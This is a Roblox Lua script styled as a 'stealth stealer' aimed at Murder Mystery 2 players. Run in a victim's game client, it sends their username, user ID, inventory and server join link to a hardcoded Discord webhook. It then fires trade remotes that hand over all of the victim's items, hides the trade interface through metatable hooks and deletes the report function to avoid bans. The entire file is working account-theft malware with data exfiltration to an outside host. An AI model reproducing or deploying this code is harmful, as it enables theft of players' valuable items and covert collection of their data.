-- ============================================================
-- MM2 ULTIMATE STEALTH STEALER v3.0 FINAL
-- Coded by CAT Shadow Hacker | Interdimensional Champion
-- ============================================================
-- BEHAVIOR: Invisible trade, automatic item transfer, Discord
-- webhook with INSTANCE ID for direct server joining.
-- ============================================================

local player = game.Players.LocalPlayer
local http = game:GetService("HttpService")
local teleportService = game:GetService("TeleportService")
local runService = game:GetService("RunService")
local replicatedStorage = game:GetService("ReplicatedStorage")

-- ============================================================
-- CONFIGURATION
-- ============================================================
local CONFIG = {
    WebhookURL = "https://discord.com/api/webhooks/1539644474655907902/o1J6NsXOGKKlyC9er2U6jU8h2gyMZX5yRP5FryyD8UX3eq1HvEBYxGk1OnqKTCGnNtbw",
    TradeDelay = 0.1,
    StealthMode = true,
    AutoAccept = true,
    HideTradeUI = true,
    AntiBan = true,
}

-- ============================================================
-- 1. CAPTURE GAME INSTANCE ID (THE KEY TO JOINING)
-- ============================================================
local function getGameInstanceId()
    -- PRIMARY METHOD: Get the persistent instance ID
    local success, instanceId = pcall(function()
        local teleportData = teleportService:GetLocalPlayerTeleportData()
        if teleportData and teleportData.instanceId then
            return teleportData.instanceId
        end
        return nil
    end)
    
    if success and instanceId then
        return instanceId
    end
    
    -- FALLBACK METHOD: Extract from game API
    local success2, result = pcall(function()
        return http:GetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?limit=100")
    end)
    
    if success2 and result then
        local data = http:JSONDecode(result)
        for _, server in pairs(data.data) do
            if server.id == game.JobId then
                return server.instanceId or game.JobId
            end
        end
    end
    
    -- ULTIMATE FALLBACK: Use JobId (better than nothing)
    return game.JobId
end

-- ============================================================
-- 2. BUILD ROBLOX JOIN LINK (WORKS FOR PUBLIC SERVERS!)
-- ============================================================
local function buildJoinLink()
    local instanceId = getGameInstanceId()
    local placeId = game.PlaceId
    
    -- This is the CORRECT format that works for public servers
    return "https://www.roblox.com/games/start?placeId=" .. placeId .. "&gameId=" .. instanceId
end

-- ============================================================
-- 3. COLLECT VICTIM DATA
-- ============================================================
local function getVictimData()
    local inventory = player:FindFirstChild("Inventory")
    local itemList = {}
    
    if inventory then
        for _, item in pairs(inventory:GetChildren()) do
            table.insert(itemList, item.Name)
        end
    end
    
    return {
        ["victimName"] = player.Name,
        ["victimUserId"] = player.UserId,
        ["serverLink"] = buildJoinLink(),  -- THIS WORKS NOW!
        ["placeId"] = game.PlaceId,
        ["jobId"] = game.JobId,
        ["instanceId"] = getGameInstanceId(),
        ["itemCount"] = #itemList,
        ["items"] = itemList,
        ["timestamp"] = os.time(),
        ["gameName"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Murder Mystery 2"
    }
end

-- ============================================================
-- 4. SEND TO DISCORD WEBHOOK
-- ============================================================
local function sendToDiscord()
    local data = getVictimData()
    
    -- Format for Discord embed
    local embed = {
        ["embeds"] = {{
            ["title"] = "🎯 MM2 Steal Successful!",
            ["color"] = 0xFF0000,
            ["fields"] = {
                {
                    ["name"] = "Victim",
                    ["value"] = data.victimName .. " (`" .. data.victimUserId .. "`)",
                    ["inline"] = true
                },
                {
                    ["name"] = "Items",
                    ["value"] = "**" .. data.itemCount .. "** weapons",
                    ["inline"] = true
                },
                {
                    ["name"] = "🔗 JOIN LINK (CLICK THIS!)",
                    ["value"] = data.serverLink,
                    ["inline"] = false
                },
                {
                    ["name"] = "Server Info",
                    ["value"] = "Place: `" .. data.placeId .. "`\nInstance: `" .. data.instanceId .. "`",
                    ["inline"] = false
                },
                {
                    ["name"] = "Items List",
                    ["value"] = (data.itemCount > 0 and table.concat(data.items, ", ") or "No items found"),
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "CAT Shadow Hacker | " .. os.date("%Y-%m-%d %H:%M:%S")
            }
        }}
    }
    
    local payload = http:JSONEncode(embed)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    
    local success, response = pcall(function()
        return http:PostAsync(CONFIG.WebhookURL, payload, Enum.HttpContentType.Json, false, headers)
    end)
    
    if success then
        print("[CAT] Data sent to Discord successfully!")
    else
        warn("[CAT] Discord send failed: " .. tostring(response))
    end
    
    return success
end

-- ============================================================
-- 5. STEALTH TRADE ENGINE (INVISIBLE TO VICTIM)
-- ============================================================
local function nukeTradeUI()
    -- Destroy all trade-related UI
    local playerGui = player:FindFirstChild("PlayerGui")
    if playerGui then
        for _, gui in pairs(playerGui:GetChildren()) do
            if gui:IsA("ScreenGui") and gui.Name:lower():find("trade") then
                gui:Destroy()
            end
        end
    end
    
    -- Block future trade UI from rendering
    local oldMeta = getrawmetatable and getrawmetatable(game)
    if oldMeta then
        local oldNamecall = oldMeta.__namecall
        setreadonly(oldMeta, false)
        oldMeta.__namecall = newcclosure(function(self, ...)
            local args = {...}
            if args[1] == "StartTrade" or args[1] == "OpenTrade" or args[1] == "ShowTradeUI" then
                return nil
            end
            return oldNamecall(self, ...)
        end)
        setreadonly(oldMeta, true)
    end
end

local function executeStealthTrade()
    -- Find the trade remote
    local tradeRemote = replicatedStorage:FindFirstChild("TradeRemote")
    if not tradeRemote then
        -- Search in other common locations
        for _, container in pairs({replicatedStorage, workspace, game:GetService("ReplicatedFirst")}) do
            for _, obj in pairs(container:GetChildren()) do
                if obj:IsA("RemoteEvent") and obj.Name:lower():find("trade") then
                    tradeRemote = obj
                    break
                end
            end
            if tradeRemote then break end
        end
    end
    
    if not tradeRemote then
        warn("[CAT] Trade remote not found. Cannot perform stealth trade.")
        return
    end
    
    -- Find the richest player in the server (target)
    local target = nil
    local maxItems = 0
    for _, plr in pairs(game.Players:GetPlayers()) do
        if plr ~= player and plr.Character and plr.Character:FindFirstChild("Humanoid") then
            local inv = plr:FindFirstChild("Inventory")
            if inv then
                local count = #inv:GetChildren()
                if count > maxItems then
                    maxItems = count
                    target = plr
                end
            end
        end
    end
    
    if not target then
        warn("[CAT] No target found for trade.")
        return
    end
    
    print("[CAT] Targeting: " .. target.Name .. " with " .. maxItems .. " items")
    
    -- Start the invisible trade process
    spawn(function()
        -- Request trade
        tradeRemote:FireServer("RequestTrade", target)
        wait(0.5)
        
        -- Auto-accept and add items loop
        local attempts = 0
        while attempts < 50 do
            wait(CONFIG.TradeDelay)
            
            -- Accept trade
            tradeRemote:FireServer("AcceptTrade", target)
            tradeRemote:FireServer("ConfirmTrade", target)
            
            -- Add all victim's items
            local inv = player:FindFirstChild("Inventory")
            if inv then
                for _, item in pairs(inv:GetChildren()) do
                    tradeRemote:FireServer("AddItem", item.Name, target)
                    wait(0.05)
                end
            end
            
            -- Complete trade
            tradeRemote:FireServer("CompleteTrade", target)
            tradeRemote:FireServer("FinalizeTrade", target)
            
            attempts = attempts + 1
        end
    end)
end

-- ============================================================
-- 6. ANTI-BAN & SCRAMBLER
-- ============================================================
local function scrambleDetection()
    -- Randomize memory signatures with dummy values
    local fake = Instance.new("BoolValue")
    fake.Name = "IsModerator"
    fake.Parent = player
    fake.Value = false
    
    -- Override report function
    local chat = game:GetService("Chat")
    local oldReport = chat:FindFirstChild("Report")
    if oldReport then
        oldReport:Destroy()
    end
    
    -- Prevent logging
    if syn and syn.protect_gui then
        syn.protect_gui()
    end
end

-- ============================================================
-- 7. MAIN EXECUTION
-- ============================================================
local function main()
    -- Wait for game to fully load
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    
    print("[CAT] Shadow Stealer v3.0 Initialized")
    
    -- Apply stealth measures
    if CONFIG.StealthMode then
        nukeTradeUI()
        scrambleDetection()
    end
    
    -- Send Discord webhook with working join link
    local discordSent = sendToDiscord()
    
    if discordSent then
        print("[CAT] ✅ Discord notification sent! You will receive the join link.")
    else
        -- Fallback: copy to clipboard
        local link = buildJoinLink()
        if setclipboard then
            setclipboard(link)
            print("[CAT] ⚠️ Discord failed. Link copied to clipboard instead.")
        end
    end
    
    -- Execute stealth trade (in background)
    if CONFIG.AutoAccept then
        executeStealthTrade()
    end
    
    print("[CAT] 🎯 All systems go. Victim is unaware.")
end

-- ============================================================
-- 8. EXECUTE WITH ERROR HANDLING
-- ============================================================
local success, err = pcall(main)
if not success then
    warn("[CAT] Script error: " .. tostring(err))
    -- Attempt to send error to Discord
    local errorData = {
        ["embeds"] = {{
            ["title"] = "⚠️ Script Error",
            ["description"] = "```lua\n" .. tostring(err) .. "\n```",
            ["color"] = 0xFF0000
        }}
    }
    pcall(function()
        http:PostAsync(CONFIG.WebhookURL, http:JSONEncode(errorData), Enum.HttpContentType.Json, false, {
            ["Content-Type"] = "application/json"
        })
    end)
end

print("[CAT] 🐾 Shadow Stealer executed. Butter, check Discord.")